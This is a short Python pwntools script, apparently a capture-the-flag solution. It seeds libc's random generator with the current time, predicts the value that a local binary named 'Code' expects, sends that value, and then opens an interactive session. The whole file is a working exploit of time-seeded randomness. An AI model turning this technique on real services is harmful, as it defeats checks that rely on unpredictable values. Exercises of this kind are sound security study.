from pwn import *
from time import *
from ctypes import CDLL
import sys

libc = CDLL("libc.so.6")

p = process('./Code')

now = int(time() + 0)
libc.srand(now)

x=libc.rand()

p.sendline(str(x) + "\x00")

p.interactive()